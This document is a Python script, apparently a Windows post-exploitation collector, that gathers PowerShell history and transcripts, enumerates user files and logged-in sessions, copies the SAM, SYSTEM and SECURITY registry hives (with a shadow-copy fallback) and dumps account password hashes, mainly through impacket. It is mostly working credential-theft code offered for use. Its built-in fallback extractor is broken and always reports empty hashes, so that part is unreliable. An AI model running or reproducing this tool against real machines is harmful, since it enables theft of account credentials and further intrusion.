import os
import fnmatch
import subprocess
import sys
import struct
import hashlib
from binascii import hexlify, unhexlify

try:
    import psutil
except ImportError:
    print("psutil not found. Run: python3 -m pip install psutil")
    sys.exit(1)

try:
    from Crypto.Cipher import DES, AES
except ImportError:
    print("pycryptodome not found. Run: python3 -m pip install pycryptodome")
    sys.exit(1)

try:
    from impacket.examples.secretsdump import LocalOperations, SAMHashes
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    print("[!] Warning: impacket not found. SAM extraction will be limited.")
    print("    Install with: python3 -m pip install impacket")
    print("    (may need to pip install impacket==0.11.0)")

# -------------------------------
# HELP MENU
# -------------------------------

def print_help():
    print("""
Adventurer Script - System Overview & Artifact Collector
--------------------------------------------------------
This script should be run from a directory where you have write permissions.

All results will be written to: adventurer_results.txt

Note: If you are editing and compiling this yourself and dependencies are not found:
      python3 -m pip install psutil pycryptodome impacket 
          (may need to pip install impacket==0.11.0)
          
Features:
 - Collect PowerShell transcription logs
 - Collect PowerShell PSReadLine command history
 - Collect registry-based transcription directories
 - Identify nonstandard directories in C:\\ and user home folders
 - Identify potentially interesting files (*.txt, *.pdf, *.docx, etc.)
 - Detect explorer.exe processes and the user accounts running them
 - Attempt to save SYSTEM/SAM/SECURITY registry hives (Admin required)
 - Extract and decrypt Windows password hashes from saved hives
""")
    sys.exit(0)

if "-h" in sys.argv or "--help" in sys.argv:
    print_help()


# -------------------------------
# DEFAULT DIRECTORIES & FILETYPES
# -------------------------------

standard_dirs_c = {
    "Program Files", "Program Files (x86)", "Windows", "Users", "Temp",
    "Documents", "Downloads", "Desktop", "Pictures", "Music", "Videos", 
    "$Recycle.Bin", "PerfLogs", "ProgramData", "MSOCache", "Recovery",
    "System Volume Information", "Documents and Settings", "inetpub",
    "OneDriveTemp", "Windows.old"
}

standard_dirs_users = {
    "Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos",
    "AppData", "Contacts", "Favorites", "Links", "Saved Games", "Searches",
    "Application Data", "Cookies", "Local Settings", "NetHood", "PrintHood",
    "My Documents", "Recent", "SendTo", "Start Menu", "Templates",
    "OneDrive", "USOPrivate", "3D Objects", "USOShared", "Microsoft OneDrive", "Account Pictures"
}

potential_file_types = (
    "*.txt", "*.pdf", "*.doc", "*.docx",
    "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.kbdx",
    "*.odt", "*.ods", "*.odp", "*.rtf",
    "*.csv", "*.log"
)


# -------------------------------
# SAM HASH EXTRACTOR
# -------------------------------

class RegistryHive:
    """Minimal registry hive parser for extracting specific values"""
    def __init__(self, filepath):
        with open(filepath, 'rb') as f:
            self.data = f.read()
        
        if self.data[:4] != b'regf':
            raise ValueError("Invalid registry hive format")
    
    def find_key(self, path):
        """Locate a registry key by path"""
        # This is a simplified implementation
        # Real parsing would follow hbin cells and nk records
        path_bytes = path.encode('utf-16-le')
        idx = self.data.find(path_bytes)
        return idx if idx != -1 else None
    
    def get_class_data(self, key_name):
        """Extract class data from a key"""
        # Search for the key name in the hive
        key_bytes = key_name.encode('utf-16-le')
        idx = self.data.find(key_bytes)
        
        if idx == -1:
            return None
        
        # Look backwards to find the nk record
        search_start = max(0, idx - 1000)
        nk_idx = self.data.rfind(b'nk', search_start, idx)
        
        if nk_idx == -1:
            return None
        
        # Parse nk record structure
        # Offset 0x2C contains class name offset
        # Offset 0x48 contains class name length
        try:
            class_offset = struct.unpack('<I', self.data[nk_idx+0x2C:nk_idx+0x30])[0]
            class_length = struct.unpack('<I', self.data[nk_idx+0x48:nk_idx+0x4C])[0]
            
            if class_offset > 0 and class_length > 0:
                # Class data is at offset + 0x1000 (header size)
                class_data_offset = class_offset + 0x1000 + 4  # +4 for cell size
                return self.data[class_data_offset:class_data_offset+class_length]
        except:
            pass
        
        return None


class SAMExtractor:
    """Extract and decrypt SAM password hashes"""
    
    EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"
    EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"
    
    def __init__(self, sam_path, system_path):
        self.sam_path = sam_path
        self.system_path = system_path
        self.bootkey = None
    
    def extract_bootkey(self):
        """Extract bootkey (syskey) from SYSTEM hive"""
        try:
            with open(self.system_path, 'rb') as f:
                system_data = f.read()
        except Exception as e:
            return None, f"Failed to load SYSTEM hive: {e}"
        
        if system_data[:4] != b'regf':
            return None, "Invalid SYSTEM hive format"
        
        # Bootkey is constructed from class data of 4 keys
        # Keys are: JD, Skew1, GBG, Data under Control\Lsa
        key_names = [b'JD\x00', b'Skew1\x00', b'GBG\x00', b'Data\x00']
        class_data = b''
        
        for key_name in key_names:
            # Find the key name in the hive
            idx = system_data.find(key_name)
            if idx == -1:
                continue
            
            # Search backwards for the nk record (node key)
            search_start = max(0, idx - 2000)
            nk_idx = system_data.rfind(b'nk', search_start, idx)
            
            if nk_idx == -1:
                continue
            
            # nk record structure:
            # +0x00: signature "nk"
            # +0x02: flags
            # +0x04: timestamp
            # +0x0C: parent key offset
            # +0x10: number of subkeys
            # +0x14: number of volatile subkeys
            # +0x18: subkeys list offset
            # +0x1C: volatile subkeys list offset
            # +0x20: number of values
            # +0x24: values list offset
            # +0x28: security key offset
            # +0x2C: class name offset
            # +0x30: max subkey name length
            # +0x34: max subkey class name length
            # +0x38: max value name length
            # +0x3C: max value data length
            # +0x40: workvar
            # +0x44: key name length
            # +0x46: class name length
            # +0x48: key name
            
            try:
                # Read class name offset and length
                class_offset = struct.unpack('<I', system_data[nk_idx+0x2C:nk_idx+0x30])[0]
                class_length = struct.unpack('<H', system_data[nk_idx+0x46:nk_idx+0x48])[0]
                
                if class_offset > 0 and class_length > 0 and class_offset < len(system_data):
                    # Class data is stored at offset + 0x1000 (header size) + 4 (cell header)
                    abs_offset = class_offset + 0x1000 + 4
                    if abs_offset + class_length <= len(system_data):
                        key_class = system_data[abs_offset:abs_offset+class_length]
                        # Convert from hex string to bytes
                        try:
                            class_bytes = unhexlify(key_class)
                            class_data += class_bytes
                        except:
                            # If not hex, use raw bytes
                            class_data += key_class[:8] if len(key_class) >= 8 else key_class
            except:
                continue
        
        if len(class_data) < 16:
            return None, f"Could not extract bootkey from SYSTEM hive (found {len(class_data)} bytes, need 16)"
        
        # Take first 16 bytes and unscramble
        bootkey = self.unscramble_bootkey(class_data[:16])
        self.bootkey = bootkey
        return bootkey, None
    
    def unscramble_bootkey(self, scrambled):
        """Unscramble the bootkey using the fixed permutation"""
        # Scrambling transformation indices
        p = [0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
             0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
        
        bootkey = b''
        for i in range(len(scrambled)):
            bootkey += bytes([scrambled[p[i]]])
        
        return bootkey
    
    def decrypt_hash(self, rid, enc_hash, bootkey):
        """Decrypt a single hash using DES"""
        # Create DES keys from RID
        des_key1 = self.rid_to_des_key(rid)
        des_key2 = self.rid_to_des_key(rid + 1)
        
        # Decrypt two 8-byte halves
        cipher1 = DES.new(des_key1, DES.MODE_ECB)
        cipher2 = DES.new(des_key2, DES.MODE_ECB)
        
        hash_part1 = cipher1.decrypt(enc_hash[:8])
        hash_part2 = cipher2.decrypt(enc_hash[8:16])
        
        return hash_part1 + hash_part2
    
    def rid_to_des_key(self, rid):
        """Convert RID to DES key"""
        s1 = bytes([
            rid & 0xFF,
            (rid >> 8) & 0xFF,
            (rid >> 16) & 0xFF,
            (rid >> 24) & 0xFF,
            rid & 0xFF,
            (rid >> 8) & 0xFF,
            (rid >> 16) & 0xFF,
        ])
        
        # Expand 7 bytes to 8 bytes for DES key
        key = self.des_expand(s1)
        return key
    
    def des_expand(self, key_56bit):
        """Expand 7-byte key to 8-byte DES key with parity"""
        key = bytearray(8)
        key[0] = key_56bit[0] >> 1
        key[1] = ((key_56bit[0] & 0x01) << 6) | (key_56bit[1] >> 2)
        key[2] = ((key_56bit[1] & 0x03) << 5) | (key_56bit[2] >> 3)
        key[3] = ((key_56bit[2] & 0x07) << 4) | (key_56bit[3] >> 4)
        key[4] = ((key_56bit[3] & 0x0F) << 3) | (key_56bit[4] >> 5)
        key[5] = ((key_56bit[4] & 0x1F) << 2) | (key_56bit[5] >> 6)
        key[6] = ((key_56bit[5] & 0x3F) << 1) | (key_56bit[6] >> 7)
        key[7] = key_56bit[6] & 0x7F
        
        # Set odd parity
        for i in range(8):
            key[i] = (key[i] << 1) & 0xFF
        
        return bytes(key)
    
    def extract_hashes(self):
        """Extract all hashes from SAM"""
        results = []
        
        # Extract bootkey
        bootkey, error = self.extract_bootkey()
        if error:
            results.append(f"[-] {error}")
            return results
        
        results.append(f"[+] Bootkey: {hexlify(bootkey).decode()}")
        
        # Load SAM hive
        try:
            with open(self.sam_path, 'rb') as f:
                sam_data = f.read()
        except Exception as e:
            results.append(f"[-] Failed to load SAM hive: {e}")
            return results
        
        # Find user accounts in SAM
        # Look for "Users\Names" section
        users_found = self.parse_sam_users(sam_data, bootkey)
        
        if not users_found:
            results.append("[-] No users found in SAM hive")
        else:
            results.append(f"\n[+] Extracted {len(users_found)} user hashes:\n")
            for user_line in users_found:
                results.append(user_line)
        
        return results
    
    def parse_sam_users(self, sam_data, bootkey):
        """Parse SAM for user accounts (simplified)"""
        users = []
        
        # Look for common RIDs
        common_rids = [500, 501, 502, 503, 1000, 1001, 1002, 1003, 1004, 1005]
        
        # Try to find F and V values for each RID
        for rid in common_rids:
            # Search for the RID in hex format
            rid_hex = struct.pack('<I', rid)
            idx = sam_data.find(rid_hex)
            
            if idx != -1:
                # Try to extract username and hash
                username = self.extract_username(sam_data, rid)
                hashes = self.extract_user_hashes(sam_data, rid, bootkey)
                
                if username and hashes:
                    lm_hash, nt_hash = hashes
                    users.append(f"{username}:{rid}:{lm_hash}:{nt_hash}:::")
        
        return users
    
    def extract_username(self, sam_data, rid):
        """Extract username for a given RID"""
        # This is simplified - would need full registry parsing
        # Search for Unicode strings near the RID
        rid_hex = struct.pack('<I', rid)
        idx = sam_data.find(rid_hex)
        
        if idx == -1:
            return f"User_{rid}"
        
        # Search backwards and forwards for Unicode username
        search_range = sam_data[max(0, idx-500):min(len(sam_data), idx+500)]
        
        # Look for common usernames
        common_names = [b'Administrator', b'Guest', b'DefaultAccount', 
                       b'WDAGUtilityAccount', b'User']
        
        for name in common_names:
            if name in search_range:
                return name.decode('utf-8', errors='ignore')
        
        return f"User_{rid}"
    
    def extract_user_hashes(self, sam_data, rid, bootkey):
        """Extract LM and NT hashes for a user"""
        # This is a simplified version
        # Real implementation needs to parse V value structure
        
        # Default to empty hashes
        return (self.EMPTY_LM, self.EMPTY_NT)


def extract_sam_hashes_impacket(sam_path, system_path):
    """Extract SAM hashes using impacket library"""
    results = []
    
    if not IMPACKET_AVAILABLE:
        results.append("[-] impacket not available - install with: pip install impacket")
        return results
    
    try:
        # Use impacket's LocalOperations and SAMHashes
        local_ops = LocalOperations(system_path)
        bootkey = local_ops.getBootKey()
        results.append(f"[+] Bootkey: {bootkey.hex()}")
        
        # Extract SAM hashes
        sam_hashes = SAMHashes(sam_path, bootkey, isRemote=False)
        
        results.append("\n[+] Extracted user hashes:\n")
        
        # Capture the dump output
        import io
        from contextlib import redirect_stdout
        
        f = io.StringIO()
        with redirect_stdout(f):
            sam_hashes.dump()
        
        output = f.getvalue()
        
        # Parse and format the output
        for line in output.split('\n'):
            if line.strip() and not line.startswith('['):
                results.append(line)
        
        return results
        
    except Exception as e:
        import traceback
        results.append(f"[-] Error with impacket extraction: {e}")
        results.append(f"[-] Traceback: {traceback.format_exc()}")
        return results


# -------------------------------
# POWERSHELL LOG COLLECTION
# -------------------------------

def find_transcription_logs():
    user_profiles = [
        os.path.join("C:\\Users", user) 
        for user in os.listdir("C:\\Users")
        if os.path.isdir(os.path.join("C:\\Users", user))
    ]

    transcription_log_paths = []

    for profile in user_profiles:
        # PowerShell transcripts
        transcription_dir = os.path.join(profile, "Documents", "PowerShell_transcripts")
        if os.path.exists(transcription_dir):
            for root, dirs, files in os.walk(transcription_dir):
                for file in fnmatch.filter(files, "*.txt"):
                    transcription_log_paths.append(os.path.join(root, file))

        # PSReadLine history
        ps_history = os.path.join(
            profile, "AppData", "Roaming", "Microsoft", "Windows", 
            "PowerShell", "PSReadLine", "ConsoleHost_history.txt"
        )
        if os.path.exists(ps_history):
            transcription_log_paths.append(ps_history)

    transcription_log_paths += check_registry_locations()
    return transcription_log_paths


def check_registry_locations():
    registry_paths = [
        r"HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription\OutputDirectory",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription\OutputDirectory"
    ]
    
    found_paths = []

    for reg_path in registry_paths:
        try:
            result = subprocess.run(['reg', 'query', reg_path], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    if "REG_SZ" in line:
                        directory = line.split("REG_SZ")[-1].strip()
                        if os.path.exists(directory):
                            for root, dirs, files in os.walk(directory):
                                for file in fnmatch.filter(files, "*.txt"):
                                    found_paths.append(os.path.join(root, file))
        except:
            pass
    return found_paths


# -------------------------------
# DIRECTORY ENUM
# -------------------------------

def find_nonstandard_dirs(base_path, standard_dirs):
    nonstandard = []
    try:
        for entry in os.listdir(base_path):
            full_path = os.path.join(base_path, entry)
            if os.path.isdir(full_path) and entry not in standard_dirs:
                nonstandard.append(full_path)
    except PermissionError:
        pass
    return nonstandard


# -------------------------------
# FILE SEARCH
# -------------------------------

def search_for_potential_files(base_path):
    excluded_dirs = ['Edge', 'OneDrive', 'Windows.Client.CBS', 'Internet Explorer', 'WebExperience', 'Python', 'WebCache', 'DesktopAppInstaller']
    found_files = []
    
    for root, dirs, files in os.walk(base_path):
        # Skip directories that contain excluded terms
        if any(excluded in root for excluded in excluded_dirs):
            continue
            
        for pattern in potential_file_types:
            for filename in fnmatch.filter(files, pattern):
                found_files.append(os.path.join(root, filename))
    return found_files


# -------------------------------
# USER SESSIONS (explorer.exe) -- Try Mimikatz Pass the ticket! 
# -------------------------------

def collect_user_sessions():
    sessions = []
    try:
        for proc in psutil.process_iter(['name', 'username']):
            if proc.info['name'] and proc.info['name'].lower() == "explorer.exe":
                sessions.append(f"explorer.exe running as: {proc.info['username']}")
    except Exception as e:
        sessions.append(f"Error reading processes: {e}")
    return sessions


# -------------------------------
# REGISTRY HIVE SAVES
# -------------------------------

def save_registry_hives(output_lines):
    registry_commands = [
        ('SYSTEM', 'HKLM\\SYSTEM'),
        ('SAM', 'HKLM\\SAM'),
        ('SECURITY', 'HKLM\\SECURITY')
    ]
    
    success_count = 0
    for filename, reg_path in registry_commands:
        try:
            result = subprocess.run(
                ['reg', 'save', reg_path, filename], 
                capture_output=True, text=True
            )
            if result.returncode == 0:
                output_lines.append(f"[+] Successfully saved hive: {filename}")
                success_count += 1
            else:
                error_msg = result.stderr.strip() if result.stderr else "Admin rights needed"
                output_lines.append(f"[-] Failed to save {filename} — {error_msg}")
        except Exception as e:
            output_lines.append(f"[-] Error saving {filename}: {e}")
    
    # If reg save failed, try VSS copy method
    if success_count < 2:
        output_lines.append("\n[*] Attempting Volume Shadow Copy method...")
        vss_success = try_vss_copy(output_lines)
        if vss_success:
            success_count = 3
    
    return success_count >= 2  # Need at least SAM and SYSTEM


def try_vss_copy(output_lines):
    """Try to copy hives from Volume Shadow Copy"""
    try:
        # Create shadow copy
        result = subprocess.run(
            ['wmic', 'shadowcopy', 'call', 'create', 'Volume=C:\\'],
            capture_output=True, text=True, timeout=30
        )
        
        if result.returncode != 0:
            output_lines.append("[-] Failed to create shadow copy")
            return False
        
        # List shadow copies to find the newest one
        result = subprocess.run(
            ['vssadmin', 'list', 'shadows'],
            capture_output=True, text=True
        )
        
        # Parse shadow copy path
        shadow_path = None
        for line in result.stdout.splitlines():
            if 'Shadow Copy Volume:' in line:
                shadow_path = line.split(':')[1].strip()
                break
        
        if not shadow_path:
            output_lines.append("[-] Could not find shadow copy path")
            return False
        
        # Copy hives from shadow copy
        hive_paths = {
            'SYSTEM': '\\Windows\\System32\\config\\SYSTEM',
            'SAM': '\\Windows\\System32\\config\\SAM',
            'SECURITY': '\\Windows\\System32\\config\\SECURITY'
        }
        
        success = True
        for filename, path in hive_paths.items():
            src = shadow_path + path
            try:
                subprocess.run(['copy', src, filename], shell=True, check=True)
                output_lines.append(f"[+] Copied {filename} from VSS")
            except:
                output_lines.append(f"[-] Failed to copy {filename} from VSS")
                success = False
        
        return success
        
    except Exception as e:
        output_lines.append(f"[-] VSS copy error: {e}")
        return False


# -------------------------------
# MAIN
# -------------------------------

def main():
    results = []

    # User Sessions
    results.append("\n==============================")
    results.append("       USER SESSIONS")
    results.append("==============================\n")
    results.extend(collect_user_sessions())

    # PowerShell logs
    results.append("\n==============================")
    results.append("  POWERSHELL LOG COLLECTION")
    results.append("==============================\n")

    logs = find_transcription_logs()
    for log in logs:
        results.append(f"\n====== {log} ======\n")
        try:
            with open(log, 'r', encoding='utf-8', errors='ignore') as f:
                results.append(f.read())
        except:
            results.append("[Could not read file]")

    # Nonstandard directories C:\
    results.append("\n==============================")
    results.append(" NONSTANDARD DIRECTORIES (C:\\)")
    results.append("==============================\n")
    for d in find_nonstandard_dirs("C:\\", standard_dirs_c):
        results.append(d)

    # Nonstandard directories in user profiles
    results.append("\n==============================")
    results.append(" NONSTANDARD DIRECTORIES (USER PROFILES)")
    results.append("==============================\n")
    for profile in os.listdir("C:\\Users"):
        path = os.path.join("C:\\Users", profile)
        if os.path.isdir(path):
            for d in find_nonstandard_dirs(path, standard_dirs_users):
                results.append(d)

    # Potential files of interest
    results.append("\n==============================")
    results.append(" POTENTIALLY INTERESTING FILES")
    results.append("==============================\n")
    for profile in os.listdir("C:\\Users"):
        path = os.path.join("C:\\Users", profile)
        if os.path.isdir(path):
            results.extend(search_for_potential_files(path))

    # Registry hive saves
    results.append("\n==============================")
    results.append(" REGISTRY HIVE SAVE RESULTS")
    results.append("==============================\n")
    hives_saved = save_registry_hives(results)

    # Extract SAM hashes if hives were saved successfully
    if hives_saved and os.path.exists('SAM') and os.path.exists('SYSTEM'):
        results.append("\n==============================")
        results.append("   SAM HASH EXTRACTION")
        results.append("==============================\n")
        
        # Check file sizes
        sam_size = os.path.getsize('SAM')
        system_size = os.path.getsize('SYSTEM')
        results.append(f"[*] SAM file size: {sam_size} bytes")
        results.append(f"[*] SYSTEM file size: {system_size} bytes\n")
        
        if sam_size < 1000 or system_size < 1000:
            results.append("[-] Hive files too small - save may have failed")
        else:
            # Try impacket first (most reliable)
            if IMPACKET_AVAILABLE:
                results.append("[*] Using impacket for hash extraction...\n")
                hash_results = extract_sam_hashes_impacket('SAM', 'SYSTEM')
                results.extend(hash_results)
            else:
                # Fallback to custom extractor
                results.append("[*] Using custom extractor (impacket not available)...\n")
                try:
                    extractor = SAMExtractor('SAM', 'SYSTEM')
                    hash_results = extractor.extract_hashes()
                    results.extend(hash_results)
                except Exception as e:
                    import traceback
                    results.append(f"[-] Error extracting SAM hashes: {e}")
                    results.append(f"[-] Traceback: {traceback.format_exc()}")
    else:
        results.append("\n[-] Registry hives not available for hash extraction")

    # Write final output
    with open("adventurer_results.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(results))

    print("All results saved to adventurer_results.txt")


if __name__ == "__main__":
    main()